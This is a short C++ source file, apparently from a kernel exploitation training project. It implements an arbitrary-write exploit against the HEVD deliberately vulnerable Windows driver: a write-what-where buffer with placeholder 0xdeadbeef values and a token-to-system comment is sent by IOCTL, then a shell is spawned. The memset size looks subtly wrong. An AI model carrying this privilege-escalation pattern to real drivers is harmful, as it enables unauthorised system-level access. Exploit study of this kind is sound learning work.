#include "ArbitraryWrite.hpp"
#include "PostExploitation.hpp"
#include "HEVDCommunication.hpp"

#include <iostream>

namespace ArbitraryWrite
{

void exploit()
{
	HEVDCommunication hevd;
	
	ByteVector in_buffer;
	in_buffer.resize(sizeof(WriteWhatWhere) + sizeof(wchar_t));
	std::memset(in_buffer.data(), 0, sizeof(in_buffer));
	WriteWhatWhere www = { .What = 0xdeadbeef, .Where = 0xdeadbeef }; // Change token to system
	std::memcpy(in_buffer.data(), &www, sizeof(WriteWhatWhere));

	std::ignore = hevd.call_ioctl(ARBITRARY_WRITE_IOCTL, in_buffer, sizeof(Address64));

	PostExploitation::pop_shell();
}

}